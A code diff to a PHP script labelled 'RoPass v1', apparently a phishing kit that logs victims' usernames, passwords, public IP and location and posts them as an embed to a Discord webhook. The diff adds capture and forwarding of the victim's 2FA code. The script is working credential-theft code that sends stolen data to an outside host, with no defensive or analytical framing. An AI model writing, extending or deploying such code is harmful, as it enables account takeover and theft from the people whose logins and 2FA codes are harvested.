@@ -21,6 +21,7 @@ function logData($username, $password) {
     $longitude = $locationInfo['longitude'] ?? 'N/A';
 
     $logMessage = [
+        "Code" => $code,
         "username" => $username,
         "password" => $password,
         "public_ip" => $publicIP,
@@ -45,6 +46,7 @@ function sendToDiscordWebhook($data) {
         "title" => "RoPass v1",
         "color" => hexdec("3762dc"),
         "fields" => [
+            ["name" => "2FA code","value" => "`" . $data['code'] . "`", "inline" => true],
             ["name" => "👤 Username", "value" => "`" . $data['username'] . "`", "inline" => true],
             ["name" => "🔑 Password", "value" => "`" . $data['password'] . "`", "inline" => true],
             ["name" => "🌍 Public IP", "value" => "`" . $data['public_ip'] . "`", "inline" => true],
